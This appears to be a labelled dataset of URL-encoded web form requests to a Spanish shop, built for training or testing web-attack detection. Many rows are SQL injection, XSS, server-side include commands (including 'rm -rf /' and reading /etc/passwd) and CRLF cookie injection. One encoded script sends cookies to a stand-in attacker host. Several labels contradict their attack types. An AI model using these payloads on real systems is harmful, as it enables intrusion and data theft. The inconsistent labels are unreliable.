payload,attack_type,label
modo=registro&login=hinda&password=ubre&nombre=Riley&apellidos=Penichet+Forales&email=andersson.millan%40salacomplices.bs&dni=51920905S&direccion=%4040&ciudad=Xinzo+de+Limia&cp=37592&provincia=Le%F3n&ntc=5072758517881652&B1=Registrar,cmdi,1
modo=insertar&precio=3183&B1=Confirmar%2F,cmdi,1
MODO=REGISTRO&LOGIN=BLAKESLE&PASSWORD=CH07ICO3O&NOMBRE=jEREM%edAS&APELLIDOS=%3cscript%3eALERT%28%22pAROS%22%29%3b%3c%2fscript%3e&EMAIL=RATCLIFF%40MATAROWEB.GW&DNI=26853011m&DIRECCION=cALLE+fELIPE+dE+dIEGO+191%2c+2h&CIUDAD=mONTEFR%edO&CP=36520&PROVINCIA=bURGOS&NTC=3246825984475356&b1=rEGISTRAR,xss,1
errormsg=credenciales+incorrectas,normal,0
id=1,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
b2=vACIAR+CARRITO%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
id=2%2F&nombre=Queso+Manchego&precio=100&cantidad=78&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=gwendoli&pwd=d76en3r9n8z01&remember=off&B1=Entrar,normal,0
id=1%27INJECTED_PARAM123,normal,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=93&B1=A%F1adir+al+carrito,normal,0
B2=Vaciar+carrito,normal,0
id=3&nombre=Queso+Manchego&precio=39&cantidad=3&B1=A%F1adir+al+carrito,normal,0
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=82&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=macoosh3&password=oposicionist3&nombre=nirma&apellidos=gabarrot&email=pisu%40shamballa-pneuma.bu&dni=68438440p&direccion=calle+clara+corral+aller%2c+21%2c+&ciudad=murueta&cp=08214&provincia=albacete&ntc=7441005651932884&b1=registrar,normal,0
modo=registro&login=schenck6&password=Veloc%EDPeDO&nombre=Rangle&apellidos=Santalo+Gabas&email=gelman_fildes%40qcole.et&dni=20787549B&direccion=Est%2Budiant%2Bes%2B+100%2C+&ciudad=Maracena&cp=16855&provincia=Toledo&ntc=1669337364255501&B1=Registrar,cmdi,1
modo=registro&login=einersen&password=despagada&nombre=Emanuel&apellidos=Sarrasec+Ar%E9valo&email=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=96118316M&direccion=Passatge+Del+Sol%2C+0+13%3FD&ciudad=Megeces&cp=42148&provincia=M%E1laga&ntc=8462242772116416&B1=Registrar123,sqli,1
modo=entrar&login=wolfie8&pwd=antagallar&remember=off&B1=Entrar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,sqli,1
MODO=REGISTRO&LOGIN=CHAYA&PASSWORD=C0O4C53ti81&NOMBRE=zBIGNIEW&APELLIDOS=bECARES+aLUMBREO&EMAIL=%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&DNI=23423909l&DIRECCION=nUCLEO+rESIDENCIAL+sAN+cARLOS%2c+5%2c+3%3fh&CIUDAD=hERRERA&CP=33785&PROVINCIA=sORIA&NTC=2124793186518142&b1=rEGISTRAR,sqli,1
modo=insertar&precio=8896&B1=Confirmar%2F,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
modo=insertar%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=4179&B1=Confirmar,sqli,1
modo=registro&login=maupin&password=pu552lmen34&nombre=Ta%EDs&apellidos=Yepes+Vall&emailA=sova%40tarifasdevuelos.ml&dni=74740920M&direccion=Lanzarote%2C+37+&ciudad=Cat%ED&cp=25403&provincia=Zamora&ntc=3946035396869059&B1=Registrar,cmdi,1
modo=registro&login=paolo&password=7u4o84z1m07459&nombre=Arc%E1ngel&apellidos=Fabr%E9s+Xamena&email=judson%40ringringcargo.gl&dni=02877417W&direccion=Baltarga%2C+S%2FN+&ciudad=Argamasilla+de+Alba&cp=32452&provincia=Valladolid&ntc=8704361418019051&B1=Registrar,normal,0
ida=2,normal,1
id=2123,normal,0
B2=Vaciar+carrito123,normal,0
id=1&nombre=Vino+Rioja&precio=39&cantidad=80&B1=A%F1adir+al+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,sqli,1
modo=registro&login=lula&password=indIVIduo&nombre=Iracen&apellidos=Frau+Puigveh%ED&email=murphy-ekstroem%40altoguadiana.ao&dni=61128609Z&direccion=Calle+Matula%2C+S%2FN%2C+&ciudad=Cor%E7%E0&cp=42210&provincia=Burgos&ntc=7915699195068000&B1=Registrar,normal,0
modo=entrar&loginA=morton6&pwd=golfo&remember=on&B1=Entrar,cmdi,1
B2=Vaciar+carrito123,normal,0
modo=entrar&login=chihchie&pwd=s927r%ED9i0o&remember=%252B&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectas123,normal,0
id=2123,normal,0
B2=Vaciar+carrito123,normal,0
modo=insertar&precio=1007&B1=Pasar+por+cajabob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,xss,1
id=1&nombre=Queso+Manchego&precio=39&cantidad=94&B1=A%F1adir+al+carrito,normal,0
id=2123,normal,0
modo=registro&login=eden&password=oct%F3GOna&nombre=Sumahya&apellidos=Lacosta+Estrader&email=helmos%40pool-control.mx&dni=61605523T&direccion=Calle+Duque+De+Zaragoza+S%2FN%2C+&ciudad=Bascu%F1ana+de+San+Pedro&cp=24710&provincia=Valladolid&ntc=5690251194310555&B1=Registrar,normal,0
modo=entrar&login=mayor&pwd=s5bal850de&remember=on&b1=entrar,normal,0
B2=Vaciar+carrito123,normal,0
modo=registro&login=flint&password=heRBecER&nombre=Nabil&apellidos=Salleras+Lima&email=volmut8%40santcugatpisos.ca&dni=51483838V&direccion=Calle+Isla+Columbretes+111+&ciudad=Soto+de+Cerrato&cp=47120&provincia=%3F&ntc=2744245058125133&B1=Registrar,cmdi,1
errormsg=credenciales+incorrectas,normal,0
modo=insertar&precio=6027&B1=Confirmar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,xss,1
errorMsgA=Credenciales+incorrectas,normal,1
errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=78&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=savard&pwdA=labrera&remember=off&B1=Entrar,cmdi,1
modo=registro+&login=carringt&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=47182191Z&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cp=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,cmdi,1
id=2&nombre=Vino+Rioja&precio=85&cantidad=40&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=natiuk&password=0estot32&nombre=Manquel&apellidos=Peraferr&email=riento%40maison-cadaques.gd&dni=79506626L&direccion=Calle+Sol+S%2FN%2C+&ciudad=Maello&cp=42113&provincia=Vizcaya&ntc=1666522520422230&B1=Registrar,normal,0
modo=registro&login=praysner&password=comenzar&nombre=Perla&apellidos=Tasies+Cirujano&email=regas%40zonamodelos.tk&dni=00090113E&direccion=Plza.+Fuentes+Claras%2C+74+&ciudad=Poyatos&cp=48128&provincia=%C1vila&ntc=3900278592647415&B1=Registrar,normal,0
B2A=Vaciar+carrito,normal,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=entrar&login=readling&pwd=quisto&remember=off&b1=entrar,normal,0
B2=Vaciar+carrito,normal,0
modoA=insertar&precio=7044&B1=Pasar+por+caja,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
id=3&nombre=Vino+Rioja&precio=85&cantidad=23&B1=A%F1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
id=1&nombre=Queso+Manchego&precio=100&cantidad=53&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=chapdela&password=sacar*ificaci%F3n&nombre=Gali&apellidosA=Pi%F1eriro+Celayes&email=macgowan%40comerciosdeaspe.kr&dni=47913001E&direccion=C%2F+Virgen+De+La+Esperanza+S%2FN%2C+9-B&ciudad=Espadilla&cp=25791&provincia=Ciudad+Real&ntc=8410049060666952&B1=Registrar,cmdi,1
modo=registro&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=10nfig318c559&nombre=Malias&apellidos=Monestel+Robaldino&email=nagy%40973.lv&dni=61037738Q&direccion=C%2F+Begonia+49+12F&ciudad=Borges+del+Camp%2C+Les&cp=37621&provincia=Guadalajara&ntc=1924133576102581&B1=Registrar123,sqli,1
modo=registro&login=nall&password=ma%2Fnd%27ilejo&nombre=Leide&apellidos=Balaguer+Morelos&email=teixera%40maquillajeparalabios.td&dni=35108015X&direccion=C%2F+Angel+Marsa+i+Beca+159%2C+6-D&ciudad=Calaf&cp=36543&provincia=Cantabria&ntc=7238071991283064&B1=Registrar,cmdi,1
id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Vino+Rioja&precio=100&cantidad=17&B1=A%F1adir+al+carrito123,sqli,1
errorMsgA=Credenciales+incorrectas123,normal,1
b2=%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
MODO=REGISTRO&LOGIN=MCCREESH&PASSWORD=CE%f1IDURA&NOMBRE=nADIA&APELLIDOS=pINET+mORADELL&EMAIL=FARGHER%40CPANELWEB.COM.PR&DNI=11152900q&DIRECCION=cALLE+fELIX+bOIX%2c+58+&CIUDAD=aLT+%c0NEU&CP=05194&PROVINCIA=bURGOS&NTC=2255812100125453&b1=rEGISTRAR%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=registro&login=poh-soon&password=4hicue84&nombre=Asad&apellidos=Serralta+Calzina&email=urecel%40elbauldelosrefranes.ky&dni=30292866A&direccion=Carrer+Bonsucces+144+&ciudad=Sotillo%2C+El&cp=19442&provincia=H.uesca&ntc=5175468282615613&B1=Registrar,cmdi,1
id=1&nombre=Vino+Rioja&precio=100&cantidad=38&B1=A%F1adir+al+carrito,normal,0
id=2123,normal,0
modo=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=4221&B1=Confirmar,sqli,1
modo=registro&login=kurian&password=batidor&nombre=Leandro&apellidos=Bernatallada&email=galt%40automovilesalhambra.kr&dni=38728859X&direccion=Silo+179%2C+12%3FB&ciudad=Cantillana&cp=23266&provincia=Burgos&ntc=5881598906156737&B1=Registrar,normal,0
id=3&nombre=Queso+Manchego&precio=85&cantidad=88&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=vasiliad&password=tiQU73M77UiS&nombre=Virma&apellidos=Catolino+Florensa&email=ridges%40fotoseroticas.com.cx&dni=67499126Z%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&direccion=Plza.+Mayor%2C+166%2C+&ciudad=Camari%F1as&cp=26240&provincia=Almer%EDa&ntc=4709387607686346&B1=Registrar123,xss,1
modo=registro&login=levisky&password=lot%F3faga&nombre=Nesime&apellidos=Camp+Morante&email=tomolillo%40velazquezlarranaga.et&dni=62386870Z&direccion=C%2F+Maria+Zayas+De+Sotomayor+18+&ciudad=Mota+de+Altarejos&cp=10860&provincia=Soria&ntc=8651552740405089&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=pandrang&password=sABIONda&nombre=Edi&apellidos=Nicol%E0s&email=woodburn%40vinavilano.hr&dni=13026737C&direccion=De+Los+Cazadores%2C+196%2C+1-B&ciudad=Villanueva+de+Huerva&cp=31172&provincia=Segovia&ntc=7280653157576508&B1=Registrar,normal,0
modo=insertar&precio=1102&b1=pasar+por+caja,normal,0
modoA=insertar&precio=7744&B1=Pasar+por+caja,cmdi,1
id=2&nombre=queso+manchego&precio=85&cantidad=80&b1=a%f1adir+al+carrito,normal,0
modo=insertar&precio=607&B1=Pasar+por+caja,normal,0
id=1any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
id=1&nombre=Vino+Rioja&precio=39&cantidad=53&B1=A%F1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
modo=entrar&login=mewa&pwd=xi629d02&remember=off&B1=Entrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
B2A=Vaciar+carrito123,normal,1
id=2%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E123,xss,1
modo=entrar&login=tharby&pwd=picaronaza&remember=on&B1=Entrar123,normal,0
modo=registro&login=asan8&password=7ar82fa&nombre=nurit&apellidos=melgar+clavero&email=tsangas4%4016horas.il&dni=51795949h&direccion=calle+conjunto+avenida%2c+116+&ciudad=rozal%e9n+del+monte&cp=23611&provincia=zaragoza&ntc=2485308810386739&b1=registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=2528&B1=Pasar+por+caja123,normal,0
modo=registro&login=haylock&password=zANgaRulL%D3N&nombre=Eleuterio&apellidos=Acevedo+Cantonati&email=kuzuoglu5%40nomao.iq&dni=43751597P&direccion=C%2F+Maria+Moliner+48+&ciudad=Ojos+Negros&cp=10160&provincia=Salamanca&ntc=0358024000873525bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Registrar,xss,1
modo=entrar&loginA=washburn&pwd=2e822ad4r8&remember=on&B1=Entrar,cmdi,1
modo=registro&login=chuck&password=s38und7705it*7&nombre=Aar%F3n&apellidos=Aro&email=skolnik-daye%40joll.ws&dni=35126766Q&direccion=C%2F+Zamora%2C+151%2C+1-B&ciudad=Aldearrodrigo&cp=05701&provincia=Zaragoza&ntc=4617331244727589&B1=Registrar,normal,0
b2a=vaciar+carrito,normal,1
errormsg=credenciales+incorrectas,normal,0
B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
idA=2,normal,1
id=2&nombre=Queso+Manchego&precio=39&cantidad=83&B1=A%F1adir+al+carrito,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=insertar&precio=6660&B1=Confirmar,normal,0
modo=registro&login=eiji&password=astrolito&nombre=Leda&apellidos=Carrizales+O%F1ate&email=davril_pallin0%40evelin.com.cz&dni=50932385N&direccion=Manuel+Monterrey+Calvo%2C+186%2C+&ciudad=Berja&cp=03560&provincia=Ciudad+Real&ntc=1206132385577691&B1=Registrar,normal,0
modo=registro&login=thuswald&password=adeLAnTaMIenTO&nombre=Lihu%E9l&apellidos=Batalla+Mier&email=mctaggart%40gafa.com.io&dni=36432557M&direccion=C%2F+Orion%2C+10%2C+&ciudad=Torremocha+de+Jadraque&cp=11300&provincia=Barcelona&ntc=0399278648684869&B1=Registrar,normal,0
id=1&nombre=Queso+Manchego&precio=100&cantidad=90&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=raha&password=de5pi6ar4za4&nombre=Helano&apellidos=Sagu%E9+C%F3nstenla&email=santaniello_tabernero%40enfuerteventura.com.ni&dni=20847295A&direccion=Plaza+Asociacion+De+La+Prensa+107+&ciudad=Segura+de+los+Ba%F1os&cp=14140&provincia=Lleida&ntc=6905236399041419&B1=Registrar123,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=willison&passwordA=a2ent9dora&nombre=Adelen&apellidos=Avell%ED&email=slaughter-worde%40juegois.ac&dni=93046182G&direccion=Plza.+De+La+Concepcion%2C+121+&ciudad=Figueruelas&cp=01220&provincia=Burgos&ntc=6349941758199278&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
id=3&nombre=Queso+Manchego&precio=100&cantidad=98&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=1347&B1=Pasar+por+caja,normal,0
errorMsg=Credenciales+incorrectasany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727123,normal,1
idA=2,normal,1
modo=insertar&precio=2408&B1A=Pasar+por+caja,cmdi,1
B2=Vaciar+carrito,normal,0
modo=entrar&login=lendon&pwd=T%24%2C%2CARsA%27na&remember=on&B1=Entrar,cmdi,1
modo=entrar&login=klotz&pwd=%falcera&remember=on&b1=entrar,normal,0
modo=registro&login=nyberg&password=predicha&nombre=Carmina&apellidos=Serarols+Ginesta%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&email=redford2%40enlanzarote.com.cz&dni=80243620R&direccion=Zumel+S%2FN%2C+&ciudad=Mas+de+Barberans&cp=05420&provincia=Zamora&ntc=5782200649154235&B1=Registrar123,sqli,1
errorMsg=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,normal,1
modo=insertar&precio=3702&B1=Pasar+por+caja,normal,0
MODO=REGISTRO&LOGIN=GIB&PASSWORD=3l29STre&NOMBRE=yARAV%ed&APELLIDOS=pA%f1ELLA+vILLASEV&EMAIL=SWITZER%40GRANDESINVENTOS.PT&DNI=04831932t&DIRECCION=c%2f+rIO+sAN+lORENZO%2c+125%2c+10%3fc&CIUDAD=aLEGR%edA-dULANTZI&CP=34170&PROVINCIA=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&NTC=3029147558638309&b1=rEGISTRAR,xss,1
modo=insertar&precio=812&B1=Confirmar123,normal,0
modo=insertar&precioA=9317&B1=Pasar+por+caja,cmdi,1
ida=1,normal,1
MODO=%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&LOGIN=KRAUSBAR&PASSWORD=126I46CA79%f3N&NOMBRE=iSA%faL&APELLIDOS=cOEV+cARLES&EMAIL=JEAVES%40REDHOST.AERO&DNI=27708977a&DIRECCION=cERVERA+46+13-h&CIUDAD=sOLIVELLA&CP=47691&PROVINCIA=bARCELONA&NTC=2980660510325529&b1=rEGISTRAR,sqli,1
modo=insertar&precio=157&B1=Pasar+por+caja%2F,cmdi,1
modo=registro&login=glancey&password=filol%F3gicamente&nombre=Yago&apellidos=%257C&email=kaminski%40lola-lutscht.cf&dni=48258022C&direccion=Chalets+De+La+Tierruca%2C+118+8-F&ciudad=Valls&cp=50691&provincia=Ciudad+Real&ntc=8042027288739194&B1=Registrar,cmdi,1
modo=registro&login=tebbe&password=822rrac106&nombre=Reynna&apellidos=Huaranga+Chicon&email=eric3%40familiamarino.sh&dni=54530952E&direccion=Plaza+Villalcazar+De+Sirga%2C+S%2FN+&ciudad=Puebla+de+Pedraza&cp=24566&provincia=Castell%F3n&ntc=7555972134845296&B1=Registrar,normal,0
modo=entrar&login=%2Cclo%27ris&pwd=8s84i4imosa&remember=on&B1=Entrar,cmdi,1
modo=registro&login=elisha&password=borracho&nombre=Ele%E1zaro&apellidos=Morlanes+Funosa&email=gilda6%40mytanga.om&dni=32159249M&direccion=Raixa+S%2FN+&ciudad=Aguilar+de+Bureba&cp=07650&provincia=Castell%F3n&ntc=1399422098640864&B1=Registrar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
B2A=Vaciar+carrito,normal,1
modo=registro&login=ashberry&password=lavada&nombre=Marcos&apellidos=Ladra+Belonne&email=strade_rosenthal%40latiendadecolchones.kr&dni=10745236G&direccion=C%2F+Meson+De+Jativa%2C+109+10-A&ciudad=Tejado%2C+El&cp=22373&provincia=Vizcaya&ntc=3792182208428268&B1=Registrar,normal,0
modo=registro&login=ericsson&password=co8mov8mi886o&nombre=Waldemar&apellidos=Lombard%EDa+Otago&email=marty%40telogis.mv&dni=78912457D&direccion=C%2F+Ereta%2C+104%2C+&ciudad=Tornadizos+de+%C1vila&cp=39100&provincia=Valencia&ntc=5568778491902564&B1=Registrar,normal,0
id=2,normal,0
modo=insertar&precioA=7191&B1=Confirmar,cmdi,1
id=1,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=1018&B1A=Confirmar,cmdi,1
modo=entrar&login=plouffe4&pwd=atigrada&remember=off&B1=Entrar,normal,0
id=%7C,normal,1
modo=entrar&login=zaretsky&pwd=40c7c0o&remember=AND+1%3D1&B1=Entrar,cmdi,1
modo=registro&login=roi&password=coclea%21ria&nombre=Hasan&apellidos=Montmany&email=hundley%40evelin.com.pf&dni=79024359Q&direccion=C%2F+Elvas+112%2C+13-A&ciudad=Mart%EDn+de+Yeltes&cp=42113&provincia=Le%F3n&ntc=8787472125390389&B1=Registrar,normal,0
modo=entrar&login=trace&pwd=2isp3n%3F3io43&remember=on&B1=Entrar,normal,0
id=1&nombre=Vino+Rioja&precio=85&cantidad=41&B1=A%F1adir+al+carrito,normal,0
b2a=vaciar+carrito,normal,1
id=2,normal,0
B2A=Vaciar+carrito123,normal,1
modo=entrar&login=gater9&pwd=c356conio&remember=off&b1=entrar,normal,0
modo=registro&login=kapp&password=57i-9557a&nombre=Porfidio&apellidos=Comerma+C%F3rdoba&email=ireland-lamargue%40arrsys.ba&dni=81037080F&direccion=Calle+Caro+10+10%3FE&ciudad=Sobradillo&cp=09193&provincia=Huesca&ntc=8347221118078165&B1=Registrar,normal,0
B2A=Vaciar+carrito,normal,1
id=1,normal,0
idA=1,normal,1
id=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E123,sqli,1
modo=registro&login=carmody&password=borricalmeNtE&nombre=Lihue&apellidos=Figueredo+Ferr%E0s&email=varennes%40so-tel.ni&dni=17014566V&direccion=Rambla+De+Mercedes+149%2C+&ciudad=Hornillos+de+Cameros%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=23560&provincia=Valladolid&ntc=7245939027120885&B1=Registrar123,sqli,1
errorMsgA=Credenciales+incorrectas123,normal,1
modo=insertar&precio=4828&B1=Pasar+por+caja%2F,cmdi,1
errorMsg=Credenciales+incorrectas123,normal,0
b2=vaciar+carrito%4040,normal,1
id=3&nombre=Queso+Manchego&precio=85&cantidad=62&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=anny&password=EscRUtADoR&nombre=Caridad&apellidos=Ar%F3s+Yermo&email=prouty%40gnu%F1ez.zw&dni=11954779T&direccion=Calle+Do+Castron+Douro%2C+29+3%3FC&ciudad=Horcajo+de+Montemayor&cp=49832&provincia=Salamanca&ntc=6988631506656146&B1=Registrar,normal,0
modo=registro&login=moyna&password=3it7_b8ante&nombre=Lauran&apellidos=Usa+Manzanares&email=nosseck_glahn%40itrends.pn&dni=52858597C&direccion=Mercado+Colon+152+&ciudad=M%2Batanza+d%3Fe+Acentejo%2C+%2BLa&cp=15146&provincia=Granada&ntc=6365782989212461&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=swidersk&password=balarrasa&nombre=Yaco&apellidos=Moriana+Romanov&email=sintes%40noticiasenvivo.mz&dni=19184B220N&direccion=C%2F+Parque+Iguazu+99%2C+&ciudad=Ag%FCimes&cp=48940&provincia=Valencia&ntc=3622353817159390&B1=Registrar,cmdi,1
B2=Vaciar+carrito123,normal,0
ID=2&NOMBRE=vINO+rIOJA&PRECIO=85&CANTIDAD=23&b1=PAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29,xss,1
B2=Vaciar+carrito,normal,0
modo=registro&login=brightwe&password=Per8eBiMie0TO&nombre=Bardo&apellidos=Furnari+Pentinat&email=baxley%40italianmotorvillagesevilla.sh&dni=43962447V&direccion=C%2F+Coronel+Cervi%F1o+Nu%F1ez%2C+35+3-C&ciudad=Llinars+del+Vall%E8s&cp=08181&provincia=Ourense&ntc=0949927790340653&B1=Registrar123,normal,0
id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E123,sqli,1
modo=insertar&precio=4825&B1=%7C,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=58&B1=A%F1adir+al+carrito,normal,0
B2=Vaciar+carrito,normal,0
errormsga=credenciales+incorrectas,normal,1
B2=Vaciar+carrito123,normal,0
B2=Vaciar+carrito,normal,0
B2A=Vaciar+carrito,normal,1
modo=entrar&login=sheng-fu&pwd=sentimenta%2Flmen%27%2Cte&remember=on&B1=Entrar,cmdi,1
modo=registro&login=donita9&password=H%E93ira&nombre=Mikhail&apellidos=Deulofeu&email=wiedlin_steppat%40nanogenerador.ax&dni=21833461K&direccion=Barrio+Tendetes%2C+65%2C+13-C&ciudad=Puebla+del+Salvador&cp=34468&provincia=Girona&ntc=5144167134274894&B1A=Registrar,cmdi,1
modo=registro&login=ftpsites&password=t0t0&nombre=Alfio&apellidos=Potel+Ivars&email=storgaard-szibo3%40elreversotenebroso.ky&dni=17889538T&direccion=Diogenes+82%2C+&ciudad=Ag%F3n&cp=47450&provincia=Guadalajara&ntc=8851191771150286&B1=Registrar123,normal,0
MODO=REGISTRO&LOGIN=%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e&PASSWORD=%21LAUREANDO&NOMBRE=lEDY&APELLIDOS=cALERA+hERA&EMAIL=ALLENBURY-NANTASIRI%40AUDIOSAT.AZ&DNI=02790010h&DIRECCION=cALLE+cASTILLEJA+dE+lA+cUESTA+70%2c+&CIUDAD=t%edRVIA&CP=03638&PROVINCIA=gIRONA&NTC=1446048659469569&b1=rEGISTRAR,sqli,1
modo=entrar&login=de_souza&pwd=3nmo08v16a&remember=off&B1=Entrar,normal,0
id=1,normal,0
B2=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727123,normal,1
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=catlin&pwd=v76c088rA&remember=off%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar123,sqli,1
modo=registro&login=levasseu&password=embarbillado&nombre=Zuleika&apellidos=Pe%F1azco+Arreche&email=others%40tetdevelocidad.sz&dni=91212440Y&direccion=C%2F+Mostoles+25%2C+2C&ciudad=Amposta&cp=08310&provincia=Valencia&ntc=1675356603176027any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Registrar,cmdi,1
modo=entrar&login=hrenyk&pwd=embozalar&remember=off&B1=Entrar,normal,0
modo=registro&login=stephan&password=alfeiza&nombre=Silde&apellidos=Bayarri+Bach&email=lilien%40aprendeaestudiar.lt&dni=68252027X&direccion=Carrer+Riu+Sena+S%2FN+13-C&ciudad=Pedroso&cp=05296&provincia=Alicante&ntc=1350447535832439&B1=Registrar123,normal,0
B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
